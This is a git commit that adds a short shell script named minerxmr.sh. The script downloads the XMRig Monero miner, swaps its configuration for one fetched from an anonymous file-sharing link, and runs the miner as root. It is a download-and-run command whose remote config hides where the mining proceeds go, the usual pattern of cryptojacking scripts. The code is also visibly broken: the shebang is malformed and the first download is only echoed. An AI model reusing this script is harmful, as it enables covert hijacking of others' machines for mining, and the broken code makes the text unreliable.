f8217ccf9e5f18bb2390dd7cd97f629787270711
minerarxmr <60713453+minerarxmr@users.noreply.github.com>
2020-02-08 17:07:59 -0300

    supportmnr

---
+++ minerxmr.sh
@@ -0,0 +1,5 @@
+#! / bin / bash
+# __BEGIN_MAIN__
+#
+echo sudo wget https://github.com/xmrig/xmrig/releases/download/v5.5.3/xmrig-5.5.3-xenial-x64.tar.gz && sudo tar -xvf xmrig-5.5.3-xenial-x64.tar.gz && cd xmrig-5.5.3 && rm -r config.json && sudo wget https://cld.pt/dl/download/d37fa8ca-17fe-4905-bcbb-badf32a7be44/sapotransfer-59ddaaea41731bt/config.json?download=true && mv config.json?download=true config.json && sudo ./xmrig
+# __END_MAIN__
